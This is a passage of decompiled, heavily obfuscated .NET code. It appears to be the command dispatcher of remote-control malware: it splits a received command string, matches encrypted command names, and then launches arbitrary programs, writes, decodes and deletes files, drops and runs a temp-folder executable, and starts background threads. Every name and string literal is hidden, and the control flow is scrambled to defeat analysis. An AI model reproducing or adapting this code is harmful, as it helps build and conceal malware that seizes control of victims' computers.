	Label1:
		if (oSFullName.Contains(<Module>._____<string>(-505255550)))
		{
			str1 = string.Concat(str1, <Module>.___<string>(985285681), str2);
		}
		if (oSFullName.Contains(<Module>._______<string>(758530680)))
		{
			goto Label5;
		}
	Label2:
		if (oSFullName.Contains(<Module>.______<string>(1197231787)))
		{
			str1 = string.Concat(str1, <Module>.______<string>(-442987474), str2);
		}
		if (!str1.Contains(<Module>._____<string>(1128206602)))
		{
			str1 = string.Concat(str1, <Module>.____<string>(-887426837), str2);
		}
		goto Label6;
	Label5:
		length1 = Type.EmptyTypes.Length + 2;
		goto Label4;
	}

	public static void ____________________()
	{
		try
		{
			Process.Start(_____________________________________________________________________________.__);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____________________(string string_0)
	{
		unsafe
		{
			int _________ = 0;
			Thread thread = null;
			int num = 0;
			int ________ = 0;
			byte[] numArray = null;
			int num1 = 0;
			int ____ = 0;
			int _________1 = 0;
			int num2 = 0;
			int num3 = 0;
			int ____1 = 0;
			int num4 = 0;
			int num5 = 0;
			int _________2 = 0;
			int ________1 = 0;
			string[] strArrays = null;
			int num6 = 0;
			int num7 = 0;
			int num8 = 0;
			string str;
			int ______ = 0;
			____________________________________________________________________ ___________________________________ = null;
			int num9 = 0;
			string[] strArrays1 = null;
			int _______ = 0;
			Thread thread1 = null;
			int num10 = 0;
			int ______1 = 0;
			Thread thread2 = null;
			string str1 = null;
			int num11 = 0;
			int num12 = 0;
			string str2 = null;
			int ______2 = 0;
			____________________________________ ___________________ = null;
			int length = 0;
			Thread thread3 = null;
			int num13 = 0;
			int num14 = 0;
			Thread thread4 = null;
			Thread thread5 = null;
			string str3 = null;
			object obj;
			int length1;
			int num15;
			int length2;
			int length3;
			int num16;
			int length4;
			____________________________________ ___________________1;
			int length5;
			Process process;
			try
			{
				if (string_0 != null)
				{
					if (!string_0.Contains(<Module>.____<string>(-1957364380)))
					{
						strArrays1 = Strings.Split(string_0, <Module>._____<string>(1052623516), -1, CompareMethod.Binary);
						obj = Type.EmptyTypes.Length + 44;
					}
					else
					{
						obj = Type.EmptyTypes.Length + 64;
					}
					while (true)
					{
					Label61:
						switch (obj)
						{
							case 0:
							{
								length = 11315;
								if (Operators.CompareString(str3, <Module>._______<string>(1419139533), false) == 0)
								{
									if (length == 11315)
									{
										_____________________________ _______________ = new _____________________________();
										thread3 = new Thread(new ThreadStart(_______________.________));
										if ((num14 & 1879048192) == (num14 & 1879048192))
										{
											thread3.Start();
											return;
										}
										break;
									}
									else
									{
										goto Label6;
									}
								}
								else if (Operators.CompareString(str3, <Module>.___<string>(-1917739370), false) == 0)
								{
									obj = Type.EmptyTypes.Length + 52;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>._____<string>(2065826580), false) == 0)
								{
									obj = Type.EmptyTypes.Length + 19;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>.______<string>(-99593800), false) == 0)
								{
									____ = ______________________._______;
									if ((16784906 ^ (____ - 4082) / 134217728) == 0)
									{
										obj = sizeof(short) + 1708471192;
										continue;
									}
									else
									{
										obj = Type.EmptyTypes.Length + 67;
										continue;
									}
								}
								else if (Operators.CompareString(str3, <Module>._____<string>(903029408), false) == 0)
								{
									________ = <Module>._______________;
									if (________ % 117 != -6563)
									{
										obj = sizeof(float) + 10;
										continue;
									}
									else if ((3 & (5309 ^ ~((length & 1874150872) - 1875))) != 3)
									{
										obj = Type.EmptyTypes.Length + 491078669;
										continue;
									}
									else
									{
										obj = (int)1903362894;
										continue;
									}
								}
								else if (Operators.CompareString(str3, <Module>._____<string>(1165117804), false) == 0)
								{
									____________________.________();
									return;
								}
								else if (Operators.CompareString(str3, <Module>._____<string>(2320632), false) == 0)
								{
									_______________________________________________.__(strArrays1[1]);
									return;
								}
								else if (Operators.CompareString(str3, <Module>._______<string>(-1706233980), false) == 0)
								{
									obj = Type.EmptyTypes.Length + 61;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>._______<string>(-1651461432), false) == 0)
								{
									obj = Type.EmptyTypes.Length + 41;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>._______<string>(-1377598692), false) == 0)
								{
									length = Type.EmptyTypes.Length + -23394;
									obj = Type.EmptyTypes.Length + 59;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>.______<string>(2115042142), false) == 0)
								{
									length = 4578;
									______________________________________________________________.___________(string.Concat(<Module>.____<string>(1816301751), _____________________________________________________________________.___(strArrays1[1])));
									return;
								}
								else if (Operators.CompareString(str3, <Module>._____<string>(340086423), false) != 0)
								{
									<Module>._________ = null;
									if (Operators.CompareString(str3, <Module>._____<string>(1877560588), false) != 0)
									{
										if (Operators.CompareString(str3, <Module>.___<string>(-1816030481), false) == 0)
										{
											length = 21544;
											if (Type.EmptyTypes.Length + -16783 != -16783)
											{
												goto case 68;
											}
										}
										else if (Operators.CompareString(str3, <Module>.____<string>(-1145298031), false) == 0)
										{
											____________________.__(strArrays1[1], strArrays1[2], false);
											return;
										}
										else if (Operators.CompareString(str3, <Module>._______<string>(-1213281048), false) == 0)
										{
											____________________.____(strArrays1[1]);
											return;
										}
										else if (Operators.CompareString(str3, <Module>.______<string>(2073591391), false) == 0)
										{
											_________ = <Module>.________________;
											if ((68509 ^ -(4194304 * _________)) != 0)
											{
												obj = Type.EmptyTypes.Length + 25;
												continue;
											}
											else
											{
												if ((1037 ^ ____ * 1972189654) == 0)
												{
													break;
												}
												obj = Type.EmptyTypes.Length + 1577822613;
												continue;
											}
										}
										else if (Operators.CompareString(str3, <Module>.____<string>(1616839311), false) == 0)
										{
											if ((num4 * 384 + 640 * num4 | -423) != -423)
											{
												obj = sizeof(uint) + -2007896705;
												continue;
											}
											else
											{
												obj = Type.EmptyTypes.Length + 7;
												continue;
											}
										}
										else if (Operators.CompareString(str3, <Module>.____<string>(1009794179), false) == 0)
										{
											length = -24827;
											if (sizeof(int) + 8516 != 8520)
											{
												___________________.____(strArrays1[1]);
												return;
											}
											___________________.__();
											return;
										}
										else if (Operators.CompareString(str3, <Module>._______<string>(-994190856), false) == 0)
										{
											if ((-12 | 5 * _________2 + 11 * _________2) == -12)
											{
												obj = Type.EmptyTypes.Length + 32;
												continue;
											}
											else
											{
												obj = Type.EmptyTypes.Length + 716935112;
												continue;
											}
										}
										else if (Operators.CompareString(str3, <Module>.______<string>(129399956), false) == 0)
										{
											obj = sizeof(double) + 30;
											continue;
										}
										else if (Operators.CompareString(str3, <Module>._____<string>(233062799), false) == 0)
										{
											length = 4700;
											______________________________________________________________.________________________(strArrays1[1], strArrays1[2], strArrays1[3]);
											if (~(num9 * 1672 + num9 * 376) != -324796416 * (num9 / 3375123) >> 9)
											{
												obj = Type.EmptyTypes.Length + 39;
												continue;
											}
											else
											{
												obj = Type.EmptyTypes.Length + -2104324626;
												continue;
											}
										}
										else if (Operators.CompareString(str3, <Module>.___<string>(331854415), false) == 0)
										{
											num1 = 63;
											____________________.__________(strArrays1[1]);
											return;
										}
										else if (Operators.CompareString(str3, <Module>.___<string>(271244811), false) == 0)
										{
											length = 26199;
											if (sizeof(ushort) + -19447 == 22490)
											{
												return;
											}
											____________________.___________(strArrays1[1]);
											return;
										}
										else if (Operators.CompareString(str3, <Module>.___<string>(1360139036), false) == 0)
										{
											if (((7054 & num4) << 28) * (num4 & 1750) != -8552)
											{
												obj = Type.EmptyTypes.Length + 37;
												continue;
											}
											else if (-1744830464 + num7 != num7)
											{
												if ((1037 ^ num12 * 1972189654) != 0)
												{
													break;
												}
												obj = Type.EmptyTypes.Length + -1655772959;
												continue;
											}
											else
											{
												break;
											}
										}
										else if (Operators.CompareString(str3, <Module>._______<string>(1425156700), false) == 0)
										{
											length = -1227;
											if (~(____1 + 3 * ____1 + 2766) != 118720 * ____1 - 5794 >> 1)
											{
												_________________________________________________________________._ = strArrays1[1];
												return;
											}
											goto case 53;
										}
										else if (Operators.CompareString(str3, <Module>.______<string>(-1872023758), false) == 0)
										{
											num = 9;
											goto case 9;
										}
										else if (Operators.CompareString(str3, <Module>.____<string>(-1000325396), false) == 0)
										{
											length = -13624;
											if ((num10 * 1677568 & 76) == 0)
											{
												_________________________________________________________________________________ _________________________________________ = new _________________________________________________________________________________();
												Thread thread6 = new Thread(new ThreadStart(_________________________________________.____________));
												if (length == -8305)
												{
													return;
												}
												thread6.Start();
												return;
											}
											else
											{
												process = Process.Start(strArrays1[1]);
												return;
											}
										}
										else if (Operators.CompareString(str3, <Module>.______<string>(782724277), false) != 0)
										{
											if (Operators.CompareString(str3, <Module>._______<string>(-804485770), false) == 0)
											{
												goto Label46;
											}
											if (Operators.CompareString(str3, <Module>._______<string>(529425657), false) == 0)
											{
												length = 26481;
												if (Type.EmptyTypes.Length + 2321 == 381)
												{
													____________________.___________(strArrays1[1]);
													return;
												}
												str = __________________________________________________________________.____(<Module>.____<string>(586994363));
												string str4 = str;
												if ((268428972 & 6609 + -805306368 * _________2) != 128)
												{
													num16 = (((num14 / 524288 | 3384) & -7936) != 256 ? Type.EmptyTypes.Length + -2143249288 : -788155254);
												}
												else
												{
													num16 = 24168;
												}
												if (Operators.CompareString(str4, <Module>.__________(num16, (-55544 + (4715 + num3) * 8 == ~(num3 + 7 * num3) ? Type.EmptyTypes.Length + -2052386147 : (int)(sizeof(double) + 26621)), Type.EmptyTypes.Length + 210), false) != 0)
												{
													Thread.Sleep(250);
													______________________________________________________________.___________(string.Concat(<Module>.____<string>(547721682), str, <Module>._____<string>(1052623516)));
													return;
												}
												if (~-num5 == num5 - -1010)
												{
													break;
												}
												str = <Module>.______<string>(755090443);
												Thread.Sleep(250);
												______________________________________________________________.___________(string.Concat(<Module>.____<string>(547721682), str, <Module>._____<string>(1052623516)));
												return;
											}
											else if (Operators.CompareString(str3, <Module>.______<string>(101766122), false) == 0)
											{
												length = -28412;
												if (536870912 + ______ % 65536 + 1154 != -(______ + ______) << 29)
												{
													int ____2 = ______________________._______;
													______2 = <Module>.___________;
													length3 = ((____2 | -4075) - 14642 != (3 * ______2 + ______2 ^ 3861) * ____2 ? (int)(sizeof(ulong) + 25005) : (int)(sizeof(ushort) + 1237813406));
												}
												else
												{
													length3 = Type.EmptyTypes.Length + -754521959;
												}
												if (length3 == 25013)
												{
													______________________________________________________________.___________(string.Concat(<Module>._____<string>(-1961487347), _________________________________________________________________.______________(), <Module>.____<string>(-1286171096)));
													return;
												}
												else
												{
													goto Label6;
												}
											}
											else if (Operators.CompareString(str3, <Module>._____<string>(1752081363), false) == 0)
											{
												int ____3 = ______________________._______;
												if ((____3 * 6 + 58 * ____3) * -729808896 == -1273)
												{
													obj = Type.EmptyTypes.Length + -1969632788;
													continue;
												}
												else if (58 * num + 6 * num - -1610612736 != num * 83 + 173 * num >> 2)
												{
													if ((-8612 ^ ____ % 1988559458) == 0)
													{
														obj = Type.EmptyTypes.Length + 1839146823;
														continue;
													}
													else
													{
														process = Process.Start(strArrays1[1]);
														return;
													}
												}
												else if ((4 & ____ * 4 + ____ * 4) != (4 * (______ & ______ << 2) & 4))
												{
													obj = Type.EmptyTypes.Length + 1173411736;
													continue;
												}
												else if (____3 / 8 * 117 + ____3 / 8 * 139 - -134217728 != ____3 * 32)
												{
													obj = Type.EmptyTypes.Length + -480641725;
													continue;
												}
												else
												{
													obj = Type.EmptyTypes.Length + 1340095669;
													continue;
												}
											}
											else if (Operators.CompareString(str3, <Module>._____<string>(1447611101), false) == 0)
											{
												if (~(num9 / 4139932) == num5 * 1073741824 << 14)
												{
													obj = Type.EmptyTypes.Length + -1036534280;
													continue;
												}
												else
												{
													obj = Type.EmptyTypes.Length + 27;
													continue;
												}
											}
											else if (Operators.CompareString(str3, <Module>.______<string>(-912762652), false) == 0)
											{
												obj = Type.EmptyTypes.Length + 40;
												continue;
											}
											else if (Operators.CompareString(str3, <Module>.___<string>(1481358244), false) == 0)
											{
												length = -22176;
												if (sizeof(int) + 16526 == 16530)
												{
													___________________._______();
													return;
												}
												else
												{
													goto Label0;
												}
											}
											else if (Operators.CompareString(str3, <Module>.______<string>(1408414764), false) == 0)
											{
												length = 19292;
												if ((num8 * 2048 & -1589723136) == (-1589723136 & num8 << 11))
												{
													___________________.___________(strArrays1[1]);
													return;
												}
												else
												{
													thread5.Start();
													return;
												}
											}
											else if (Operators.CompareString(str3, <Module>.____<string>(1696204587), false) == 0)
											{
												length = 27459;
												obj = Type.EmptyTypes.Length + 28;
												continue;
											}
											else if (Operators.CompareString(str3, <Module>._____<string>(-1797147620), false) == 0)
											{
												length = 18428;
												if (sizeof(ushort) + 17455 == 17457)
												{
													______________________________________________________________.__________________(strArrays1[1], strArrays1[2], true);
													obj = Type.EmptyTypes.Length + 6;
													continue;
												}
											}
											else if (Operators.CompareString(str3, <Module>._____<string>(1977258557), false) != 0)
											{
												if (Operators.CompareString(str3, <Module>._____<string>(382562598), false) != 0)
												{
													goto case 69;
												}
												length = -4432;
												if ((______________________._______ % 4036271 ^ 8390091) == 0)
												{
													________1 = <Module>.______________;
													if ((________1 / 67108864 - 8380 & 467152128) == 467143936)
													{
														length2 = Type.EmptyTypes.Length + 2140064777;
													}
													else
													{
														int ______3 = <Module>.___________;
														_________1 = <Module>.________________;
														length2 = ((______3 * 14 + 2 * ______3) * 2048 - 75587584 == _________1 * 909639680 ? Type.EmptyTypes.Length + 306113298 : Type.EmptyTypes.Length + 1668462087);
													}
												}
												else
												{
													length2 = 11943;
												}
												if (length2 == 11943)
												{
													__________________._ = string.Concat(__________________._, strArrays1[1]);
													return;
												}
												return;
											}
											else
											{
												obj = checked((int)22);
												continue;
											}
										}
										else
										{
											obj = sizeof(ulong) + 18;
											continue;
										}
										____________________.__(strArrays1[1], strArrays1[2], true);
										obj = sizeof(double) + 28;
										continue;
									}
									else
									{
										length = -651;
										if (Type.EmptyTypes.Length + -23987 != -23987)
										{
											return;
										}
									}
									____________________._____(strArrays1[1], strArrays1[2]);
									if (length == -651)
									{
										return;
									}
									____________________.__________(strArrays1[1]);
									return;
								}
								else
								{
									obj = sizeof(float) + 6;
									continue;
								}
							}
							case 1:
							{
								<Module>._____________ = 480802764;
								thread5 = new Thread(new ThreadStart(______________________________________________________________.______________________________));
								obj = Type.EmptyTypes.Length + 33;
								continue;
							}
							case 2:
							{
								___________________________________.__ = strArrays1[2];
								___________________________________.___ = Convert.ToInt32(strArrays1[3]);
								length = Type.EmptyTypes.Length + -27051;
								obj = sizeof(double) + 63;
								continue;
							}
							case 3:
							{
								return;
							}
							case 4:
							{
								thread3.Start();
								return;
							}
							case 5:
							{
								__________________________________________________________________._____(<Module>.___<string>(1766172096), strArrays1[1]);
								______________________________________________________________._______________ = strArrays1[1];
								obj = sizeof(long) + 4;
								continue;
							}
							case 6:
							{
								return;
							}
							case 7:
							{
								___________________.____(strArrays1[1]);
								return;
							}
							case 8:
							{
								return;
							}
							case 9:
							{
								___________________________________ = new ____________________________________________________________________()
								{
									_ = strArrays1[1]
								};
								if ((26092 ^ _________2 * -536870912) != 0)
								{
									obj = Type.EmptyTypes.Length + 2;
									continue;
								}
								else if ((length / 8388608 ^ 7796) != 0)
								{
									num5 = -1062840359;
									break;
								}
								else
								{
									obj = sizeof(short) + 1737170524;
									continue;
								}
							}
							case 10:
							{
								______________________.________(string.Concat(______________________________________________________________._______________________, <Module>.____<string>(1457469466)));
								return;
							}
							case 11:
							{
								return;
							}
							case 12:
							{
								return;
							}
							case 13:
							{
								goto Label21;
							}
							case 14:
							{
								______________________.________(strArrays1[1]);
								return;
							}
							case 15:
							{
								return;
							}
							case 16:
							{
								__________________________________ __________________ = new __________________________________();
								Thread thread7 = new Thread(new ThreadStart(__________________._______));
								if (length == -6190)
								{
									thread7.Start();
									return;
								}
								else
								{
									____________________.________();
									return;
								}
							}
							case 17:
							{
								______________________________________________________________.___________(string.Concat(<Module>._______<string>(-2144414364), ___________________._____(), <Module>.____<string>(-1286171096)));
								____1 = ______________________._______;
								return;
							}
							case 18:
							{
								____________________.__(strArrays1[1], strArrays1[2], false);
								return;
							}
							case 19:
							{
								________________________________ _________________ = new ________________________________();
								thread2 = new Thread(new ThreadStart(_________________.______));
								if ((268437881 ^ (num4 & 8654) % 123508870) != 0)
								{
									obj = Type.EmptyTypes.Length + 45;
									continue;
								}
								else
								{
									_______ = <Module>._____________;
									if ((973078528 & _______ / 632) != (_______ / 214225 >> 2 & 973078528))
									{
										obj = sizeof(int) + -787138310;
										continue;
									}
									else
									{
										break;
									}
								}
							}
							case 20:
							{
								return;
							}
							case 21:
							{
								_______________________________________________.__(strArrays1[1]);
								return;
							}
							case 22:
							{
								______________________________________________________________._________________(strArrays1[1], strArrays1[2], Convert.ToInt32(strArrays1[3]), Convert.ToInt32(strArrays1[4]));
								obj = sizeof(uint) + -1;
								continue;
							}
							case 23:
							{
								File.WriteAllBytes(strArrays1[1], numArray);
								return;
							}
							case 24:
							{
								return;
							}
							case 25:
							{
								____________________.___(strArrays1[1]);
								return;
							}
							case 26:
							{
								______________________________________________._ = false;
								return;
							}
							case 27:
							{
								_____________________________________________________________________________.____________();
								return;
							}
							case 28:
							{
								______________________________________________________________.__________________(strArrays1[1], strArrays1[2], false);
								if (length == 28070)
								{
									__________________________________________________________________._____(<Module>._______<string>(-446465376), <Module>._____<string>(142639785));
									______________________________________________________________.______________(<Module>._____<string>(-671355959), <Module>._______<string>(-327564836));
									if (length == 9665)
									{
										_________________________________________________._______(Convert.ToInt32(strArrays1[1]), false);
										return;
									}
									return;
								}
								return;
							}
							case 29:
							{
								return;
							}
							case 30:
							{
								goto Label24;
							}
							case 31:
							{
								return;
							}
							case 32:
							{
								_________________________________________________________________._____(strArrays1[1]);
								return;
							}
							case 33:
							{
								thread5.Start();
								return;
							}
							case 34:
							{
								____________________.____(strArrays1[1]);
								return;
							}
							case 35:
							{
								Random random = new Random();
								string tempPath = Path.GetTempPath();
								num3 = random.Next(10000, 90000);
								str1 = string.Concat(tempPath, num3.ToString(), <Module>.______<string>(-176601469));
								if (length == 17737)
								{
									process = Process.Start(strArrays1[1]);
									return;
								}
								goto Label15;
							}
							case 36:
							{
								return;
							}
							case 37:
							{
								_________________________________________________.___________(strArrays1[1]);
								return;
							}
							case 38:
							{
								____________________._________(strArrays1[1]);
								return;
							}
							case 39:
							{
								return;
							}
							case 40:
							{
								___________________._();
								return;
							}
							case 41:
							{
								______________________.______();
								return;
							}
							case 42:
							{
								Process.Start(str1);
								______________________________________________________________.______________(<Module>._____<string>(1464211711), string.Concat(<Module>._______<string>(619600478), str1));
								if ((_________ / 63952569 | 3199) == 3199)
								{
									if (______________________._______ * 116015104 == 1225106395)
									{
										obj = Type.EmptyTypes.Length + -208404402;
										continue;
									}
									else
									{
										obj = sizeof(ushort) + 6;
										continue;
									}
								}
								else if (772407296 * num4 * -260096 != 9860)
								{
									obj = sizeof(int) + 1835215106;
									continue;
								}
								else if ((_________1 * 34 + 30 * _________1 | -59) == -59)
								{
									obj = sizeof(long) + -1627545973;
									continue;
								}
								else
								{
									break;
								}
							}
							case 43:
							{
								File.Delete(string.Concat(______________________.___, strArrays1[1]));
								return;
							}
							case 44:
							{
								str3 = strArrays1[0];
								if (Operators.CompareString(str3, <Module>.______<string>(-818008844), false) == 0)
								{
									obj = Type.EmptyTypes.Length + 54;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>._______<string>(1200049341), false) == 0)
								{
									obj = sizeof(float) + 13;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>.___<string>(-385067598), false) != 0)
								{
									if (Operators.CompareString(str3, <Module>._____<string>(-1760330727), false) != 0)
									{
										goto case 0;
									}
									obj = checked((int)43);
									continue;
								}
								else
								{
									length = 26400;
									if ((_________2 << 22 >> 22) + 4233 != -_________2)
									{
										length4 = (228360192 + (num7 << 18) != -4866 + (num7 << 21) << 6 ? Type.EmptyTypes.Length + 20633 : (int)(sizeof(float) + -1961692646));
									}
									else
									{
										length4 = Type.EmptyTypes.Length + -1112648496;
									}
									if (length4 == 20633)
									{
										______________________________________________________________.___________(string.Concat(<Module>.____<string>(-1335102124), ___________________.______(strArrays1[1]), <Module>.___<string>(-1617572493)));
										return;
									}
									goto Label16;
								}
							}
							case 45:
							{
								thread2.Start();
								return;
							}
							case 46:
							{
								return;
							}
							case 47:
							{
								___________________1 = ___________________;
								(new Thread(new ThreadStart(___________________1._))).Start();
								if (length == -20737)
								{
									if ((______1 + ______1) / 7338 != -2059906234)
									{
										_________________________________________________________________._____(strArrays1[1]);
										return;
									}
								}
								return;
							}
							case 48:
							{
								return;
							}
							case 49:
							{
								_________________________________________________._______(Convert.ToInt32(strArrays1[1]), false);
								return;
							}
							case 50:
							{
								___________________ = new ____________________________________()
								{
									_ = strArrays1[1]
								};
								length = 25929;
								___________________1 = ___________________;
								(new Thread(new ThreadStart(___________________1._))).Start();
								if (length == -20737)
								{
									if ((______1 + ______1) / 7338 != -2059906234)
									{
										_________________________________________________________________._____(strArrays1[1]);
										return;
									}
								}
								return;
							}
							case 51:
							{
								goto Label26;
							}
							case 52:
							{
								if (!_______________________________________________._)
								{
									______________________________________________________________.______________________(strArrays1[1]);
								}
								if (!_______________________________________________._)
								{
									goto Label11;
								}
								if ((9999 ^ num12 + num12 + -5306) == 0)
								{
									num9 = ___________._;
									if (-3823616 + ~(580 * num9 + num9 * 444) == (num9 - 1146) * 1024)
									{
										length5 = 2064712751;
									}
									else
									{
										num10 = (int)-748921169;
										length5 = num10;
									}
								}
								else
								{
									length5 = Type.EmptyTypes.Length + -6190;
								}
								length = length5;
								obj = Type.EmptyTypes.Length + 16;
								continue;
							}
							case 53:
							{
								if (Operators.CompareString(strArrays1[2], <Module>._______<string>(-1500496896), false) == 0)
								{
									goto case 42;
								}
								______________________________________________________________.______________(<Module>.____<string>(-899364305), string.Concat(<Module>.___<string>(-473502109), str1));
								length = 15567;
								if (Type.EmptyTypes.Length + 16305 == -11071)
								{
									__________________._ = string.Concat(__________________._, strArrays1[1]);
									return;
								}
								return;
							}
							case 54:
							{
								______________________________________________________________.__.Close();
								return;
							}
							case 55:
							{
								process = Process.Start(strArrays1[1]);
								return;
							}
							case 56:
							{
								goto Label27;
							}
							case 57:
							{
								return;
							}
							case 58:
							{
								____________________._______(strArrays1[2], strArrays1[1]);
								obj = Type.EmptyTypes.Length + 11;
								continue;
							}
							case 59:
							{
								goto Label0;
							}
							case 60:
							{
								__________________________________________________________________._____(<Module>._______<string>(-446465376), <Module>._____<string>(142639785));
								______________________________________________________________.______________(<Module>._____<string>(-671355959), <Module>._______<string>(-327564836));
								if (length == 9665)
								{
									_________________________________________________._______(Convert.ToInt32(strArrays1[1]), false);
									return;
								}
								return;
							}
							case 61:
							{
								_________________________________________________________________._ = <Module>.__________(Type.EmptyTypes.Length + 55649, Type.EmptyTypes.Length + 57253, ((num3 * 52 + num3 * 12 | -17 | num3 << 12) == -17 ? 27 : Type.EmptyTypes.Length + 1914786943));
								length = -31167;
								if (4238 + ((____1 << 3) - 5591) == 2 * (2896 + ____1 + 3 * ____1))
								{
									return;
								}
								______________________________________________________________________ ____________________________________ = new ______________________________________________________________________()
								{
									_____ = strArrays1[1]
								};
								if (length == -11932)
								{
									_____________________________________________________________________________.____________();
									return;
								}
								______________________________________________________________.________________________________________________________________ _________________________________ = new ______________________________________________________________.________________________________________________________________()
								{
									_ = ____________________________________
								};
								thread1 = new Thread(new ThreadStart(_________________________________._));
								obj = checked((int)66);
								continue;
							}
							case 62:
							{
								return;
							}
							case 63:
							{
								____________________.__________(strArrays1[1]);
								return;
							}
							case 65:
							{
								____________________.________();
								return;
							}
							case 66:
							{
								thread1.Start();
								return;
							}
							case 67:
							{
								______________________._________(strArrays1[1], strArrays1[2]);
								obj = Type.EmptyTypes.Length + 48;
								continue;
							}
							case 68:
							{
								bool flag = true;
								bool flag1 = true;
								if (Operators.CompareString(strArrays1[2], <Module>.______<string>(-1350974774), false) == 0)
								{
									if (length == 30110)
									{
										______________________________________________._(strArrays1[1]);
										return;
									}
									flag = false;
								}
								if (Operators.CompareString(strArrays1[3], <Module>._____<string>(-1990978585), false) == 0)
								{
									length = -25861;
									if (sizeof(int) + -30042 == -32154)
									{
										return;
									}
									flag1 = false;
								}
								______________________.__________(strArrays1[1], flag, flag1);
								int ________2 = <Module>._______________;
								if ((________2 * 5 + ________2 * 3 ^ 9044) + 9850 == ________2 * 67108864 >> 16)
								{
									obj = sizeof(short) + 2065535173;
									continue;
								}
								else
								{
									obj = Type.EmptyTypes.Length + 15;
									continue;
								}
							}
							case 69:
							{
								length = 8186;
								if ((32767 | num13 % 4 / 195525) != 32767)
								{
									goto case 19;
								}
								if (Operators.CompareString(str3, <Module>.____<string>(-1129260993), false) == 0)
								{
									num13 = length;
									length = -30314;
									if (num13 == -27363)
									{
										goto case 5;
									}
									__________________._(strArrays1[1], strArrays1[2], strArrays1[3], strArrays1[4], strArrays1[5], strArrays1[6]);
									if ((8395353 ^ (______2 & 8290) - -1080419749 & ______2) != 0)
									{
										if (length != -30314)
										{
											______________________.______();
											return;
										}
										return;
									}
									else
									{
										______________________.______();
										return;
									}
								}
								else if (Operators.CompareString(str3, <Module>._______<string>(1022378589), false) == 0)
								{
									int _________3 = <Module>.________________;
									if ((-9721 & (-1216984678 & num5) - 3177) != 0)
									{
										obj = sizeof(float) + 54;
										continue;
									}
									else if ((536870912 & ((_________3 + _________3) * 536870912 ^ <Module>.________________ / 123436025)) != 0)
									{
										int _______1 = <Module>.____________;
										if ((11 * _______1 + _______1 * 5 | -12) == -12)
										{
											break;
										}
										if ((3445 ^ -(4186408 & _________)) != 0 || (1 & _________ + _________ - 2815) == 1)
										{
											______1 = <Module>.___________;
											if (((______1 << 23) + 843 | -8383677) == -8383669)
											{
												obj = Type.EmptyTypes.Length + 2079635632;
												continue;
											}
											else
											{
												obj = sizeof(float) + -2125959417;
												continue;
											}
										}
										else
										{
											break;
										}
									}
									else
									{
										obj = sizeof(int) + 1904814692;
										continue;
									}
								}
								else if (Operators.CompareString(str3, <Module>.____<string>(1025831217), false) == 0)
								{
									length = -16825;
									if (~(_________ + 3 * _________ + 2766) != 118720 * _________ - 5794 >> 1)
									{
										byte[] numArray1 = File.ReadAllBytes(strArrays1[1]);
										int length6 = Type.EmptyTypes.Length + 761;
										if (-(num3 * 180912128) != 6299)
										{
											num15 = 1183;
										}
										else if (8481 + num14 != -num14)
										{
											______ = <Module>.__________;
											num15 = (-782237696 + (______ ^ 1236) * 512 != ______ * -4193792 ? Type.EmptyTypes.Length + -1320858906 : -1177888468);
										}
										else
										{
											num15 = ((4198601 ^ num3 % 169057) == 0 ? Type.EmptyTypes.Length + -96998318 : (int)(sizeof(int) + -1568167655));
										}
										numArray = ___________________________________________________________________._______(numArray1, <Module>.__________(length6, num15, Type.EmptyTypes.Length + 11));
										if (~(-427 | num) / 134217728 != -2058868628)
										{
											obj = Type.EmptyTypes.Length + 23;
											continue;
										}
										else
										{
											obj = Type.EmptyTypes.Length + 1787865228;
											continue;
										}
									}
									else
									{
										return;
									}
								}
								else if (Operators.CompareString(str3, <Module>._____<string>(1189138378), false) == 0)
								{
									if ((-8421 ^ ____ + ____ * 15) != 0)
									{
										length1 = Type.EmptyTypes.Length + -11849;
									}
									else
									{
										length1 = ((________ << 16) - 1043333120 != ________ * 65536 + 3945 ? Type.EmptyTypes.Length + -1184964527 : (int)(sizeof(Guid) + -1291609624));
									}
									length = length1;
									obj = sizeof(int) + 52;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>._______<string>(-933401141), false) == 0)
								{
									length = -21839;
									if (((_______ * 3 + _______ - 4164 ^ 8343) != 0 ? Type.EmptyTypes.Length + 20770 : Type.EmptyTypes.Length + 2019159496) != 20770)
									{
										thread5.Start();
										return;
									}
									(new Thread(new ThreadStart(_________________________________________________.______))).Start();
									return;
								}
								else if (Operators.CompareString(str3, <Module>._____<string>(-555057380), false) == 0)
								{
									obj = sizeof(ushort) + -1;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>.______<string>(-1941108343), false) == 0)
								{
									obj = Type.EmptyTypes.Length + 50;
									continue;
								}
								else if (Operators.CompareString(str3, <Module>.______<string>(-606825867), false) != 0)
								{
									if (Operators.CompareString(str3, <Module>._______<string>(-242747795), false) == 0)
									{
										goto case 5;
									}
									<Module>.___ = num3;
									if (Operators.CompareString(str3, <Module>._____<string>(251518400), false) != 0)
									{
										if (Operators.CompareString(str3, <Module>._____<string>(1095005382), false) != 0)
										{
											goto Label6;
										}
										length = Type.EmptyTypes.Length + -29183;
										_________________________________________________._______(Convert.ToInt32(strArrays1[1]), false);
										return;
									}
									else
									{
										length = 16275;
										if (sizeof(ushort) + -9418 != -9416)
										{
											return;
										}
										_______________________________._(strArrays1[1]);
										return;
									}
								}
								else
								{
									length = 28517;
									if ((4259 ^ num1 / 134217728) != 0)
									{
										______________________________________________._(strArrays1[1]);
										return;
									}
									thread.Start();
									return;
								}
							}
							case 70:
							{
								str = <Module>.______<string>(755090443);
								Thread.Sleep(250);
								______________________________________________________________.___________(string.Concat(<Module>.____<string>(547721682), str, <Module>._____<string>(1052623516)));
								return;
							}
							case 71:
							{
								___________________________________.____ = Convert.ToInt32(strArrays1[4]);
								____________________________________________________________________ ___________________________________1 = ___________________________________;
								thread4 = new Thread(new ThreadStart(___________________________________1._));
								if (length == -27051)
								{
									thread4.Start();
									return;
								}
								else
								{
									goto case 2;
								}
							}
							case 72:
							{
								return;
							}
							case 73:
							{
								thread.Start();
								return;
							}
							case 74:
							{
								return;
							}
						}
					Label71:
						string_0 = string_0.Replace(<Module>._______<string>(-188634634), string.Empty);
						string string0 = string_0;
						_________2 = <Module>._________________;
